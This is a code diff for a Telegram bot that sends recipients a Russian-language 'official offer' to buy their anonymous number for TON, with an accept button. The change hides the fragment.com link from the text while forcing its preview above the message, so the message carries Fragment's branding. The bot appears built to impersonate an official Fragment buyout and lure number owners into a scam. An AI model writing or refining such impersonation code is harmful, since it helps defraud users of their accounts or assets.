@@ -67,7 +67,7 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # Текст, который пойдет ПОД превью
+    # ТЕКСТ (ССЫЛКИ ЗДЕСЬ НЕТ)
     offer_text = (
         f"Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
@@ -81,13 +81,14 @@ async def send_offer(message: Message):
     ]])
 
     try:
-        # Отправляем сообщение. Telegram сам подтянет картинку и заголовок из ссылки fragment.com
+        # Отправляем сообщение с превью, но без ссылки в тексте
         await bot.send_message(
             chat_id=message.chat.id,
-            text=f"{fragment_link}\n\n{offer_text}", # Ссылка идет ПЕРВОЙ, чтобы Telegram сделал превью именно её
+            text=offer_text,
             reply_markup=keyboard,
             business_connection_id=message.business_connection_id,
             link_preview_options=LinkPreviewOptions(
+                url=fragment_link,
                 is_disabled=False,
                 prefer_large_media=True,
                 show_above_text=True
@@ -100,7 +101,7 @@ async def send_offer(message: Message):
         except:
             pass
 
-# --- ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ ---
+# --- ОСТАЛЬНОЙ КОД ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     conn_id = callback.message.business_connection_id
